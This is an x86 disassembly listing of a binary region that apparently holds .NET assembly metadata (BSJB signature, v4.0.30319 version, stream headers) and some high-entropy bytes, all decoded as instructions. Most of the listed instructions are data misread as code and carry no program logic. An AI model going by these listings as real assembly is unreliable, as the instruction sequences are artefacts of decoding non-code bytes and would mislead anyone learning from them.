  405804:	87 71 84             	xchg   %esi,-0x7c(%ecx)
  405807:	eb 1b                	jmp    0x405824
  405809:	17                   	pop    %ss
  40580a:	1f                   	pop    %ds
  40580b:	cb                   	lret
  40580c:	01 72 53             	add    %esi,0x53(%edx)
  40580f:	20 0c 00             	and    %cl,(%eax,%eax,1)
  405812:	b3 ff                	mov    $0xff,%bl
  405814:	e8 d7 7f 94 63       	call   0x63d4d7f0
  405819:	6b 77 0a a3          	imul   $0xffffffa3,0xa(%edi),%esi
  40581d:	68 dc 01 72 53       	push   $0x537201dc
  405822:	ed                   	in     (%dx),%eax
  405823:	39 23                	cmp    %esp,(%ebx)
  405825:	82 0f 3e             	orb    $0x3e,(%edi)
  405828:	bb ec 7a 23 72       	mov    $0x72237aec,%ebx
  40582d:	eb 01                	jmp    0x405830
  40582f:	72 53                	jb     0x405884
  405831:	ec                   	in     (%dx),%al
  405832:	9f                   	lahf
  405833:	1f                   	pop    %ds
  405834:	9c                   	pushf
  405835:	61                   	popa
  405836:	e5 7a                	in     $0x7a,%eax
  405838:	2b e1                	sub    %ecx,%esp
  40583a:	ba 0f 5a 93 6b       	mov    $0x6b935a0f,%edx
  40583f:	b5 af                	mov    $0xaf,%ch
  405841:	c6                   	(bad)
  405842:	f0 01 72 53          	lock add %esi,0x53(%edx)
  405846:	9b                   	fwait
  405847:	d7                   	xlat   %ds:(%ebx)
  405848:	e1 51                	loope  0x40589b
  40584a:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  40584b:	11 db                	adc    %ebx,%ebx
  40584d:	59                   	pop    %ecx
  40584e:	01 8f f9 05 01 72    	add    %ecx,0x720105f9(%edi)
  405854:	53                   	push   %ebx
  405855:	17                   	pop    %ss
  405856:	66 ac                	data16 lods %ds:(%esi),%al
  405858:	70 1a                	jo     0x405874
  40585a:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  40585b:	26 dc bb d8 5d 19 c9 	fdivrl %es:-0x36e6a228(%ebx)
  405862:	c9                   	leave
  405863:	cb                   	lret
  405864:	13 01                	adc    (%ecx),%eax
  405866:	72 53                	jb     0x4058bb
  405868:	88 7d 7b             	mov    %bh,0x7b(%ebp)
  40586b:	b4 a4                	mov    $0xa4,%ah
  40586d:	84 40 ff             	test   %al,-0x1(%eax)
  405870:	55                   	push   %ebp
  405871:	f1                   	int1
  405872:	78 68                	js     0x4058dc
  405874:	82 2b 90             	subb   $0x90,(%ebx)
  405877:	b8 36 01 72 53       	mov    $0x53720136,%eax
  40587c:	80 23 11             	andb   $0x11,(%ebx)
  40587f:	b7 72                	mov    $0x72,%bh
  405881:	17                   	pop    %ss
  405882:	24 3b                	and    $0x3b,%al
  405884:	01 72 53             	add    %esi,0x53(%edx)
  405887:	a9 d2 dc 58 5f       	test   $0x5f58dcd2,%eax
  40588c:	7f d9                	jg     0x405867
  40588e:	50                   	push   %eax
  40588f:	01 72 53             	add    %esi,0x53(%edx)
  405892:	63 3a                	arpl   %edi,(%edx)
  405894:	ee                   	out    %al,(%dx)
  405895:	10 72 be             	adc    %dh,-0x42(%edx)
  405898:	14 a4                	adc    $0xa4,%al
  40589a:	72 d2                	jb     0x40586e
  40589c:	bf f8 a5 6d e3       	mov    $0xe36da5f8,%edi
  4058a1:	3b a8 03 53 52 60    	cmp    0x60525303(%eax),%ebp
  4058a7:	ad                   	lods   %ds:(%esi),%eax
  4058a8:	43                   	inc    %ebx
  4058a9:	75 01                	jne    0x4058ac
  4058ab:	72 53                	jb     0x405900
  4058ad:	bf aa 98 d4 39       	mov    $0x39d498aa,%edi
  4058b2:	e5 2f                	in     $0x2f,%eax
  4058b4:	28 6f 0e             	sub    %ch,0xe(%edi)
  4058b7:	8a 14 17             	mov    (%edi,%edx,1),%dl
  4058ba:	2a ba ce 02 63 9e    	sub    -0x619cfd32(%edx),%bh
  4058c0:	91                   	xchg   %eax,%ecx
  4058c1:	09 07                	or     %eax,(%edi)
  4058c3:	cb                   	lret
  4058c4:	80 fe 8d             	cmp    $0x8d,%dh
  4058c7:	8c f9                	mov    %?,%ecx
  4058c9:	14 d6                	adc    $0xd6,%al
  4058cb:	87 fd                	xchg   %edi,%ebp
  4058cd:	00 e4                	add    %ah,%ah
  4058cf:	88 02                	mov    %al,(%edx)
  4058d1:	72 53                	jb     0x405926
  4058d3:	04 b1                	add    $0xb1,%al
  4058d5:	22 b2 3f 46 9e 02    	and    0x29e463f(%edx),%dh
  4058db:	72 53                	jb     0x405930
  4058dd:	e0 6c                	loopne 0x40594b
  4058df:	2f                   	das
  4058e0:	fc                   	cld
  4058e1:	3b 55 fa             	cmp    -0x6(%ebp),%edx
  4058e4:	05 15 54 96 2f       	add    $0x2f965415,%eax
  4058e9:	55                   	push   %ebp
  4058ea:	54                   	push   %esp
  4058eb:	fa                   	cli
  4058ec:	42                   	inc    %edx
  4058ed:	53                   	push   %ebx
  4058ee:	4a                   	dec    %edx
  4058ef:	42                   	inc    %edx
  4058f0:	01 00                	add    %eax,(%eax)
  4058f2:	01 00                	add    %eax,(%eax)
  4058f4:	00 00                	add    %al,(%eax)
  4058f6:	00 00                	add    %al,(%eax)
  4058f8:	0c 00                	or     $0x0,%al
  4058fa:	00 00                	add    %al,(%eax)
  4058fc:	76 34                	jbe    0x405932
  4058fe:	2e 30 2e             	xor    %ch,%cs:(%esi)
  405901:	33 30                	xor    (%eax),%esi
  405903:	33 31                	xor    (%ecx),%esi
  405905:	39 00                	cmp    %eax,(%eax)
  405907:	00 00                	add    %al,(%eax)
  405909:	00 04 00             	add    %al,(%eax,%eax,1)
  40590c:	60                   	pusha
  40590d:	00 00                	add    %al,(%eax)
  40590f:	00 24 12             	add    %ah,(%edx,%edx,1)
  405912:	00 00                	add    %al,(%eax)
  405914:	23 7e 00             	and    0x0(%esi),%edi
  405917:	00 84 12 00 00 4c 0d 	add    %al,0xd4c0000(%edx,%edx,1)
  40591e:	00 00                	add    %al,(%eax)
  405920:	23 53 74             	and    0x74(%ebx),%edx
  405923:	72 69                	jb     0x40598e
  405925:	6e                   	outsb  %ds:(%esi),(%dx)
  405926:	67 73 00             	addr16 jae 0x405929
  405929:	00 00                	add    %al,(%eax)
  40592b:	00 d0                	add    %dl,%al
  40592d:	1f                   	pop    %ds
  40592e:	00 00                	add    %al,(%eax)
  405930:	10 00                	adc    %al,(%eax)
  405932:	00 00                	add    %al,(%eax)
  405934:	23 47 55             	and    0x55(%edi),%eax
  405937:	49                   	dec    %ecx
  405938:	44                   	inc    %esp
  405939:	00 00                	add    %al,(%eax)
  40593b:	00 e0                	add    %ah,%al
  40593d:	1f                   	pop    %ds
  40593e:	00 00                	add    %al,(%eax)
  405940:	88 06                	mov    %al,(%esi)
  405942:	00 00                	add    %al,(%eax)
  405944:	23 42 6c             	and    0x6c(%edx),%eax
  405947:	6f                   	outsl  %ds:(%esi),(%dx)
  405948:	62 00                	bound  %eax,(%eax)
  40594a:	00 00                	add    %al,(%eax)
  40594c:	00 00                	add    %al,(%eax)
  40594e:	00 00                	add    %al,(%eax)
  405950:	02 00                	add    (%eax),%al
  405952:	00 01                	add    %al,(%ecx)
  405954:	57                   	push   %edi
  405955:	37                   	aaa
  405956:	02 1e                	add    (%esi),%bl
  405958:	09 07                	or     %eax,(%edi)
  40595a:	00 00                	add    %al,(%eax)
  40595c:	00 fa                	add    %bh,%dl
  40595e:	01 33                	add    %esi,(%ebx)
  405960:	00 16                	add    %dl,(%esi)
  405962:	00 00                	add    %al,(%eax)
  405964:	01 00                	add    %eax,(%eax)
  405966:	00 00                	add    %al,(%eax)
  405968:	5b                   	pop    %ebx
  405969:	00 00                	add    %al,(%eax)
  40596b:	00 1d 00 00 00 1d    	add    %bl,0x1d000000
  405971:	00 00                	add    %al,(%eax)
  405973:	00 5b 00             	add    %bl,0x0(%ebx)
  405976:	00 00                	add    %al,(%eax)
  405978:	59                   	pop    %ecx
  405979:	00 00                	add    %al,(%eax)
  40597b:	00 08                	add    %cl,(%eax)
  40597d:	00 00                	add    %al,(%eax)
  40597f:	00 b0 00 00 00 17    	add    %dh,0x17000000(%eax)
  405985:	00 00                	add    %al,(%eax)
  405987:	00 02                	add    %al,(%edx)
  405989:	00 00                	add    %al,(%eax)
  40598b:	00 1c 00             	add    %bl,(%eax,%eax,1)
  40598e:	00 00                	add    %al,(%eax)
  405990:	07                   	pop    %es
  405991:	00 00                	add    %al,(%eax)
  405993:	00 05 00 00 00 06    	add    %al,0x6000000
  405999:	00 00                	add    %al,(%eax)
  40599b:	00 0b                	add    %cl,(%ebx)
  40599d:	00 00                	add    %al,(%eax)
  40599f:	00 01                	add    %al,(%ecx)
  4059a1:	00 00                	add    %al,(%eax)
  4059a3:	00 02                	add    %al,(%edx)
  4059a5:	00 00                	add    %al,(%eax)
  4059a7:	00 02                	add    %al,(%edx)
  4059a9:	00 00                	add    %al,(%eax)
  4059ab:	00 0d 00 00 00 02    	add    %cl,0x2000000
  4059b1:	00 00                	add    %al,(%eax)
  4059b3:	00 00                	add    %al,(%eax)
  4059b5:	00 07                	add    %al,(%edi)
  4059b7:	00 01                	add    %al,(%ecx)
  4059b9:	00 00                	add    %al,(%eax)
  4059bb:	00 00                	add    %al,(%eax)
  4059bd:	00 06                	add    %al,(%esi)
  4059bf:	00 8f 00 98 00 06    	add    %cl,0x6009800(%edi)
  4059c5:	00 a8 00 98 00 06    	add    %ch,0x6009800(%eax)
  4059cb:	00 b4 00 98 00 06 00 	add    %dh,0x60098(%eax,%eax,1)
  4059d2:	c6 00 1a             	movb   $0x1a,(%eax)
  4059d5:	00 06                	add    %al,(%esi)
  4059d7:	00 e2                	add    %ah,%dl
  4059d9:	00 1a                	add    %bl,(%edx)
  4059db:	00 06                	add    %al,(%esi)
  4059dd:	00 e8                	add    %ch,%al
  4059df:	00 1a                	add    %bl,(%edx)
  4059e1:	00 06                	add    %al,(%esi)
  4059e3:	00 f0                	add    %dh,%al
  4059e5:	00 1a                	add    %bl,(%edx)
  4059e7:	00 06                	add    %al,(%esi)
  4059e9:	00 f7                	add    %dh,%bh
  4059eb:	00 1a                	add    %bl,(%edx)
  4059ed:	00 06                	add    %al,(%esi)
  4059ef:	00 fc                	add    %bh,%ah
  4059f1:	00 1a                	add    %bl,(%edx)
  4059f3:	00 0a                	add    %cl,(%edx)
  4059f5:	00 01                	add    %al,(%ecx)
  4059f7:	01 18                	add    %ebx,(%eax)
  4059f9:	01 06                	add    %eax,(%esi)
  4059fb:	00 30                	add    %dh,(%eax)
  4059fd:	01 47 01             	add    %eax,0x1(%edi)
  405a00:	06                   	push   %es
  405a01:	00 65 01             	add    %ah,0x1(%ebp)
  405a04:	73 01                	jae    0x405a07
  405a06:	06                   	push   %es
  405a07:	00 8e 01 73 01 06    	add    %cl,0x6017301(%esi)
  405a0d:	00 95 01 a1 01 06    	add    %dl,0x601a101(%ebp)
  405a13:	00 b4 01 a1 01 06 00 	add    %dh,0x601a1(%ecx,%eax,1)
  405a1a:	cb                   	lret
  405a1b:	01 1a                	add    %ebx,(%edx)
  405a1d:	00 06                	add    %al,(%esi)
  405a1f:	00 d3                	add    %dl,%bl
  405a21:	01 1a                	add    %ebx,(%edx)
  405a23:	00 0a                	add    %cl,(%edx)
  405a25:	00 db                	add    %bl,%bl
  405a27:	01 f1                	add    %esi,%ecx
  405a29:	01 0a                	add    %ecx,(%edx)
  405a2b:	00 04 02             	add    %al,(%edx,%eax,1)
  405a2e:	f1                   	int1
  405a2f:	01 06                	add    %eax,(%esi)
  405a31:	00 1d 02 f1 01 06    	add    %bl,0x601f102
  405a37:	00 26                	add    %ah,(%esi)
  405a39:	02 f1                	add    %cl,%dh
  405a3b:	01 06                	add    %eax,(%esi)
  405a3d:	00 3e                	add    %bh,(%esi)
  405a3f:	02 f1                	add    %cl,%dh
  405a41:	01 0a                	add    %ecx,(%edx)
  405a43:	00 5b 02             	add    %bl,0x2(%ebx)
  405a46:	f1                   	int1
  405a47:	01 0a                	add    %ecx,(%edx)
  405a49:	00 63 02             	add    %ah,0x2(%ebx)
  405a4c:	f1                   	int1
  405a4d:	01 0a                	add    %ecx,(%edx)
  405a4f:	00 71 02             	add    %dh,0x2(%ecx)
  405a52:	f1                   	int1
  405a53:	01 0a                	add    %ecx,(%edx)
  405a55:	00 89 02 f1 01 06    	add    %cl,0x601f102(%ecx)
  405a5b:	00 9a 02 f1 01 06    	add    %bl,0x601f102(%edx)
  405a61:	00 a5 02 f1 01 06    	add    %ah,0x601f102(%ebp)
  405a67:	00 b0 02 1a 00 06    	add    %dh,0x6001a02(%eax)
  405a6d:	00 b5 02 1a 00 7b    	add    %dh,0x7b001a02(%ebp)
  405a73:	00 c1                	add    %al,%cl
  405a75:	02 00                	add    (%eax),%al
  405a77:	00 06                	add    %al,(%esi)
  405a79:	00 cf                	add    %cl,%bh
  405a7b:	02 1a                	add    (%edx),%bl
  405a7d:	00 06                	add    %al,(%esi)
  405a7f:	00 d9                	add    %bl,%cl
  405a81:	02 e5                	add    %ch,%ah
  405a83:	02 06                	add    (%esi),%al
  405a85:	00 fa                	add    %bh,%dl
  405a87:	02 1a                	add    (%edx),%bl
  405a89:	00 0a                	add    %cl,(%edx)
  405a8b:	00 06                	add    %al,(%esi)
  405a8d:	03 16                	add    (%esi),%edx
  405a8f:	03 0a                	add    (%edx),%ecx
  405a91:	00 2c 03             	add    %ch,(%ebx,%eax,1)
  405a94:	16                   	push   %ss
  405a95:	03 06                	add    (%esi),%eax
  405a97:	00 37                	add    %dh,(%edi)
  405a99:	03 41 03             	add    0x3(%ecx),%eax
  405a9c:	06                   	push   %es
  405a9d:	00 4b 03             	add    %cl,0x3(%ebx)
  405aa0:	41                   	inc    %ecx
  405aa1:	03 06                	add    (%esi),%eax
  405aa3:	00 59 03             	add    %bl,0x3(%ecx)
  405aa6:	41                   	inc    %ecx
  405aa7:	03 06                	add    (%esi),%eax
  405aa9:	00 6e 03             	add    %ch,0x3(%esi)
  405aac:	41                   	inc    %ecx
  405aad:	03 06                	add    (%esi),%eax
  405aaf:	00 73 03             	add    %dh,0x3(%ebx)
  405ab2:	41                   	inc    %ecx
  405ab3:	03 06                	add    (%esi),%eax
  405ab5:	00 80 03 41 03 06    	add    %al,0x6034103(%eax)
  405abb:	00 85 03 41 03 06    	add    %al,0x6034103(%ebp)
  405ac1:	00 8c 03 1a 00 06 00 	add    %cl,0x6001a(%ebx,%eax,1)
  405ac8:	92                   	xchg   %eax,%edx
  405ac9:	03 1a                	add    (%edx),%ebx
  405acb:	00 06                	add    %al,(%esi)
  405acd:	00 98 03 1a 00 06    	add    %bl,0x6001a03(%eax)
  405ad3:	00 9e 03 1a 00 06    	add    %bl,0x6001a03(%esi)
  405ad9:	00 a5 03 1a 00 06    	add    %ah,0x6001a03(%ebp)
  405adf:	00 bf 03 1a 00 0a    	add    %bh,0xa001a03(%edi)
  405ae5:	00 d6                	add    %dl,%dh
  405ae7:	03 e0                	add    %eax,%esp
  405ae9:	03 06                	add    (%esi),%eax
  405aeb:	00 eb                	add    %ch,%bl
  405aed:	03 1a                	add    (%edx),%ebx
  405aef:	00 06                	add    %al,(%esi)
  405af1:	00 01                	add    %al,(%ecx)
  405af3:	04 1a                	add    $0x1a,%al
  405af5:	00 06                	add    %al,(%esi)
  405af7:	00 08                	add    %cl,(%eax)
  405af9:	04 1a                	add    $0x1a,%al
  405afb:	00 06                	add    %al,(%esi)
  405afd:	00 18                	add    %bl,(%eax)
  405aff:	04 1a                	add    $0x1a,%al
  405b01:	00 06                	add    %al,(%esi)
  405b03:	00 1f                	add    %bl,(%edi)
  405b05:	04 28                	add    $0x28,%al
  405b07:	04 06                	add    $0x6,%al
  405b09:	00 3a                	add    %bh,(%edx)
  405b0b:	04 28                	add    $0x28,%al
  405b0d:	04 06                	add    $0x6,%al
  405b0f:	00 53 04             	add    %dl,0x4(%ebx)
  405b12:	28 04 06             	sub    %al,(%esi,%eax,1)
  405b15:	00 72 04             	add    %dh,0x4(%edx)
  405b18:	28 04 06             	sub    %al,(%esi,%eax,1)
  405b1b:	00 8d 04 28 04 06    	add    %cl,0x6042804(%ebp)
  405b21:	00 aa 04 28 04 06    	add    %ch,0x6042804(%edx)
  405b27:	00 c7                	add    %al,%bh
  405b29:	04 28                	add    $0x28,%al
  405b2b:	04 06                	add    $0x6,%al
  405b2d:	00 d4                	add    %dl,%ah
  405b2f:	04 28                	add    $0x28,%al
  405b31:	04 06                	add    $0x6,%al
  405b33:	00 ed                	add    %ch,%ch
  405b35:	04 28                	add    $0x28,%al
  405b37:	04 06                	add    $0x6,%al
  405b39:	00 04 05 28 04 06 00 	add    %al,0x60428(,%eax,1)
  405b40:	1f                   	pop    %ds
  405b41:	05 28 04 06 00       	add    $0x60428,%eax
  405b46:	2a 05 28 04 06 00    	sub    0x60428,%al
  405b4c:	35 05 28 04 06       	xor    $0x6042805,%eax
  405b51:	00 40 05             	add    %al,0x5(%eax)
  405b54:	50                   	push   %eax
  405b55:	05 06 00 61 05       	add    $0x5610006,%eax
  405b5a:	81 05 06 00 a1 05 81 	addl   $0x60581,0x5a10006
  405b61:	05 06 00 
  405b64:	bf 05 81 05 06       	mov    $0x6058105,%edi
  405b69:	00 d7                	add    %dl,%bh
  405b6b:	05 eb 05 06 00       	add    $0x605eb,%eax
  405b70:	0a 06                	or     (%esi),%al
  405b72:	eb 05                	jmp    0x405b79
  405b74:	06                   	push   %es
  405b75:	00 18                	add    %bl,(%eax)
  405b77:	06                   	push   %es
  405b78:	eb 05                	jmp    0x405b7f
  405b7a:	06                   	push   %es
  405b7b:	00 20                	add    %ah,(%eax)
  405b7d:	06                   	push   %es
  405b7e:	39 06                	cmp    %eax,(%esi)
  405b80:	06                   	push   %es
  405b81:	00 53 06             	add    %dl,0x6(%ebx)
  405b84:	1a 00                	sbb    (%eax),%al
  405b86:	06                   	push   %es
  405b87:	00 67 06             	add    %ah,0x6(%edi)
  405b8a:	1a 00                	sbb    (%eax),%al
  405b8c:	06                   	push   %es
  405b8d:	00 79 06             	add    %bh,0x6(%ecx)
  405b90:	1a 00                	sbb    (%eax),%al
  405b92:	06                   	push   %es
  405b93:	00 80 06 1a 00 06    	add    %al,0x6001a06(%eax)
  405b99:	00 91 06 9a 06 06    	add    %dl,0x6069a06(%ecx)
  405b9f:	00 a6 06 9a 06 06    	add    %ah,0x6069a06(%esi)
  405ba5:	00 b4 06 bc 06 06 00 	add    %dh,0x606bc(%esi,%eax,1)
  405bac:	cd 06                	int    $0x6
  405bae:	bc 06 06 00 d3       	mov    $0xd3000606,%esp
  405bb3:	06                   	push   %es
  405bb4:	bc 06 06 00 da       	mov    $0xda000606,%esp
  405bb9:	06                   	push   %es
  405bba:	1a 00                	sbb    (%eax),%al
  405bbc:	06                   	push   %es
  405bbd:	00 df                	add    %bl,%bh
  405bbf:	06                   	push   %es
  405bc0:	1a 00                	sbb    (%eax),%al
  405bc2:	06                   	push   %es
  405bc3:	00 e6                	add    %ah,%dh
  405bc5:	06                   	push   %es
  405bc6:	1a 00                	sbb    (%eax),%al
  405bc8:	06                   	push   %es
  405bc9:	00 ed                	add    %ch,%ch
  405bcb:	06                   	push   %es
  405bcc:	1a 00                	sbb    (%eax),%al
  405bce:	06                   	push   %es
  405bcf:	00 f4                	add    %dh,%ah
  405bd1:	06                   	push   %es
  405bd2:	1a 00                	sbb    (%eax),%al
  405bd4:	06                   	push   %es
  405bd5:	00 fe                	add    %bh,%dh
  405bd7:	06                   	push   %es
  405bd8:	1a 00                	sbb    (%eax),%al
  405bda:	06                   	push   %es
  405bdb:	00 06                	add    %al,(%esi)
  405bdd:	07                   	pop    %es
  405bde:	1a 00                	sbb    (%eax),%al
  405be0:	00 00                	add    %al,(%eax)
  405be2:	00 00                	add    %al,(%eax)
  405be4:	0b 07                	or     (%edi),%eax
  405be6:	00 00                	add    %al,(%eax)
  405be8:	00 00                	add    %al,(%eax)
  405bea:	01 00                	add    %eax,(%eax)
  405bec:	01 00                	add    %eax,(%eax)
  405bee:	80 01 10             	addb   $0x10,(%ecx)
  405bf1:	00 14 07             	add    %dl,(%edi,%eax,1)
  405bf4:	00 00                	add    %al,(%eax)
  405bf6:	d1 00                	roll   $1,(%eax)
  405bf8:	01 00                	add    %eax,(%eax)
  405bfa:	01 00                	add    %eax,(%eax)
  405bfc:	01 01                	add    %eax,(%ecx)
  405bfe:	00 00                	add    %al,(%eax)
  405c00:	16                   	push   %ss
  405c01:	07                   	pop    %es
  405c02:	00 00                	add    %al,(%eax)
  405c04:	75 00                	jne    0x405c06
  405c06:	01 00                	add    %eax,(%eax)
  405c08:	01 00                	add    %eax,(%eax)
  405c0a:	05 01 10 00 14       	add    $0x14001001,%eax
  405c0f:	07                   	pop    %es
  405c10:	00 00                	add    %al,(%eax)
  405c12:	d1 00                	roll   $1,(%eax)
  405c14:	02 00                	add    (%eax),%al
  405c16:	01 00                	add    %eax,(%eax)
  405c18:	00 01                	add    %al,(%ecx)
  405c1a:	10 00                	adc    %al,(%eax)
  405c1c:	19 07                	sbb    %eax,(%edi)
  405c1e:	00 00                	add    %al,(%eax)
  405c20:	d1 00                	roll   $1,(%eax)
  405c22:	07                   	pop    %es
  405c23:	00 09                	add    %cl,(%ecx)
  405c25:	00 03                	add    %al,(%ebx)
  405c27:	01 10                	add    %edx,(%eax)
  405c29:	00 14 07             	add    %dl,(%edi,%eax,1)
  405c2c:	00 00                	add    %al,(%eax)
  405c2e:	d1 00                	roll   $1,(%eax)
  405c30:	08 00                	or     %al,(%eax)
  405c32:	15 00 a0 00 00       	adc    $0xa000,%eax
  405c37:	00 1e                	add    %bl,(%esi)
  405c39:	07                   	pop    %es
  405c3a:	00 00                	add    %al,(%eax)
  405c3c:	00 00                	add    %al,(%eax)
  405c3e:	09 00                	or     %eax,(%eax)
  405c40:	17                   	pop    %ss
  405c41:	00 80 01 00 00 20    	add    %al,0x20000001(%eax)
  405c47:	07                   	pop    %es
  405c48:	00 00                	add    %al,(%eax)
  405c4a:	d1 00                	roll   $1,(%eax)
  405c4c:	09 00                	or     %eax,(%eax)
  405c4e:	18 00                	sbb    %al,(%eax)
  405c50:	03 01                	add    (%ecx),%eax
  405c52:	00 00                	add    %al,(%eax)
  405c54:	14 07                	adc    $0x7,%al
  405c56:	00 00                	add    %al,(%eax)
  405c58:	75 00                	jne    0x405c5a
  405c5a:	12 00                	adc    (%eax),%al
  405c5c:	1f                   	pop    %ds
  405c5d:	00 03                	add    %al,(%ebx)
  405c5f:	01 10                	add    %edx,(%eax)
  405c61:	00 1e                	add    %bl,(%esi)
  405c63:	07                   	pop    %es
  405c64:	00 00                	add    %al,(%eax)
  405c66:	d1 00                	roll   $1,(%eax)
  405c68:	13 00                	adc    (%eax),%eax
  405c6a:	1f                   	pop    %ds
  405c6b:	00 81 01 10 00 23    	add    %al,0x23001001(%ecx)
  405c71:	07                   	pop    %es
  405c72:	00 00                	add    %al,(%eax)
  405c74:	d1 00                	roll   $1,(%eax)
  405c76:	15 00 27 00 a0       	adc    $0xa0002700,%eax
  405c7b:	00 00                	add    %al,(%eax)
  405c7d:	00 28                	add    %ch,(%eax)
  405c7f:	07                   	pop    %es
  405c80:	00 00                	add    %al,(%eax)
  405c82:	00 00                	add    %al,(%eax)
  405c84:	15 00 29 00 01       	adc    $0x1002900,%eax
  405c89:	01 10                	add    %edx,(%eax)
  405c8b:	00 2a                	add    %ch,(%edx)
  405c8d:	07                   	pop    %es
  405c8e:	00 00                	add    %al,(%eax)
  405c90:	d1 00                	roll   $1,(%eax)
  405c92:	15 00 2a 00 0a       	adc    $0xa002a00,%eax
  405c97:	01 10                	add    %edx,(%eax)
  405c99:	00 14 07             	add    %dl,(%edi,%eax,1)
  405c9c:	00 00                	add    %al,(%eax)
  405c9e:	65 01 16             	add    %edx,%gs:(%esi)
  405ca1:	00 3b                	add    %bh,(%ebx)
  405ca3:	00 a0 00 00 00 2f    	add    %ah,0x2f000000(%eax)
  405ca9:	07                   	pop    %es
  405caa:	00 00                	add    %al,(%eax)
  405cac:	00 00                	add    %al,(%eax)
  405cae:	19 00                	sbb    %eax,(%eax)
  405cb0:	3b 00                	cmp    (%eax),%eax
  405cb2:	80 01 10             	addb   $0x10,(%ecx)
  405cb5:	00 31                	add    %dh,(%ecx)
  405cb7:	07                   	pop    %es
  405cb8:	00 00                	add    %al,(%eax)
  405cba:	d1 00                	roll   $1,(%eax)
  405cbc:	19 00                	sbb    %eax,(%eax)
  405cbe:	3c 00                	cmp    $0x0,%al
  405cc0:	a0 00 00 00 36       	mov    0x36000000,%al
  405cc5:	07                   	pop    %es
  405cc6:	00 00                	add    %al,(%eax)
  405cc8:	00 00                	add    %al,(%eax)
  405cca:	19 00                	sbb    %eax,(%eax)
  405ccc:	3c 00                	cmp    $0x0,%al
  405cce:	00 01                	add    %al,(%ecx)
  405cd0:	10 00                	adc    %al,(%eax)
  405cd2:	38 07                	cmp    %al,(%edi)
  405cd4:	00 00                	add    %al,(%eax)
  405cd6:	d1 00                	roll   $1,(%eax)
  405cd8:	19 00                	sbb    %eax,(%eax)
  405cda:	3f                   	aas
  405cdb:	00 a0 00 00 00 3d    	add    %ah,0x3d000000(%eax)
  405ce1:	07                   	pop    %es
  405ce2:	00 00                	add    %al,(%eax)
  405ce4:	00 00                	add    %al,(%eax)
  405ce6:	1b 00                	sbb    (%eax),%eax
  405ce8:	44                   	inc    %esp
  405ce9:	00 80 01 10 00 3f    	add    %al,0x3f001001(%eax)
  405cef:	07                   	pop    %es
  405cf0:	00 00                	add    %al,(%eax)
  405cf2:	d1 00                	roll   $1,(%eax)
  405cf4:	1b 00                	sbb    (%eax),%eax
  405cf6:	45                   	inc    %ebp
  405cf7:	00 03                	add    %al,(%ebx)
  405cf9:	01 10                	add    %edx,(%eax)
  405cfb:	00 14 07             	add    %dl,(%edi,%eax,1)
  405cfe:	00 00                	add    %al,(%eax)
  405d00:	d1 00                	roll   $1,(%eax)
  405d02:	1c 00                	sbb    $0x0,%al
  405d04:	4a                   	dec    %edx
  405d05:	00 03                	add    %al,(%ebx)
  405d07:	01 10                	add    %edx,(%eax)
  405d09:	00 19                	add    %bl,(%ecx)
  405d0b:	07                   	pop    %es
  405d0c:	00 00                	add    %al,(%eax)
  405d0e:	d1 00                	roll   $1,(%eax)
  405d10:	1e                   	push   %ds
  405d11:	00 4d 00             	add    %cl,0x0(%ebp)
  405d14:	83 01 10             	addl   $0x10,(%ecx)
  405d17:	00 1e                	add    %bl,(%esi)
  405d19:	07                   	pop    %es
  405d1a:	00 00                	add    %al,(%eax)
  405d1c:	d1 00                	roll   $1,(%eax)
  405d1e:	1e                   	push   %ds
  405d1f:	00 4f 00             	add    %cl,0x0(%edi)
  405d22:	03 01                	add    (%ecx),%eax
  405d24:	10 00                	adc    %al,(%eax)
  405d26:	28 07                	sub    %al,(%edi)
  405d28:	00 00                	add    %al,(%eax)
  405d2a:	d1 00                	roll   $1,(%eax)
  405d2c:	1e                   	push   %ds
  405d2d:	00 52 00             	add    %dl,0x0(%edx)
  405d30:	03 01                	add    (%ecx),%eax
  405d32:	10 00                	adc    %al,(%eax)
  405d34:	2f                   	das
  405d35:	07                   	pop    %es
  405d36:	00 00                	add    %al,(%eax)
  405d38:	d1 00                	roll   $1,(%eax)
  405d3a:	1e                   	push   %ds
  405d3b:	00 54 00 03          	add    %dl,0x3(%eax,%eax,1)
  405d3f:	01 10                	add    %edx,(%eax)
  405d41:	00 36                	add    %dh,(%esi)
  405d43:	07                   	pop    %es
  405d44:	00 00                	add    %al,(%eax)
  405d46:	d1 00                	roll   $1,(%eax)
  405d48:	1e                   	push   %ds
  405d49:	00 56 00             	add    %dl,0x0(%esi)
  405d4c:	03 01                	add    (%ecx),%eax
  405d4e:	10 00                	adc    %al,(%eax)
  405d50:	3d 07 00 00 d1       	cmp    $0xd1000007,%eax
  405d55:	00 1e                	add    %bl,(%esi)
  405d57:	00 58 00             	add    %bl,0x0(%eax)
  405d5a:	03 01                	add    (%ecx),%eax
  405d5c:	10 00                	adc    %al,(%eax)
  405d5e:	44                   	inc    %esp
  405d5f:	07                   	pop    %es
  405d60:	00 00                	add    %al,(%eax)
  405d62:	d1 00                	roll   $1,(%eax)
  405d64:	1e                   	push   %ds
  405d65:	00 5a 00             	add    %bl,0x0(%edx)
  405d68:	80 01 10             	addb   $0x10,(%ecx)
  405d6b:	00 44 07 00          	add    %al,0x0(%edi,%eax,1)
  405d6f:	00 d1                	add    %dl,%cl
  405d71:	00 1e                	add    %bl,(%esi)
  405d73:	00 5c 00 06          	add    %bl,0x6(%eax,%eax,1)
  405d77:	06                   	push   %es
  405d78:	46                   	inc    %esi
  405d79:	07                   	pop    %es
  405d7a:	0a 00                	or     (%eax),%al
  405d7c:	01 00                	add    %eax,(%eax)
  405d7e:	14 07                	adc    $0x7,%al
  405d80:	0a 00                	or     (%eax),%al
  405d82:	01 00                	add    %eax,(%eax)
  405d84:	1e                   	push   %ds
  405d85:	07                   	pop    %es
  405d86:	0a 00                	or     (%eax),%al
  405d88:	01 00                	add    %eax,(%eax)
  405d8a:	28 07                	sub    %al,(%edi)
  405d8c:	0a 00                	or     (%eax),%al
  405d8e:	01 00                	add    %eax,(%eax)
  405d90:	36 07                	ss pop %es
  405d92:	0a 00                	or     (%eax),%al
  405d94:	06                   	push   %es
  405d95:	00 2f                	add    %ch,(%edi)
  405d97:	07                   	pop    %es
  405d98:	0a 00                	or     (%eax),%al
  405d9a:	31 00                	xor    %eax,(%eax)
  405d9c:	14 07                	adc    $0x7,%al
  405d9e:	2f                   	das
  405d9f:	00 06                	add    %al,(%esi)
  405da1:	00 14 07             	add    %dl,(%edi,%eax,1)
  405da4:	2f                   	das
  405da5:	00 11                	add    %dl,(%ecx)
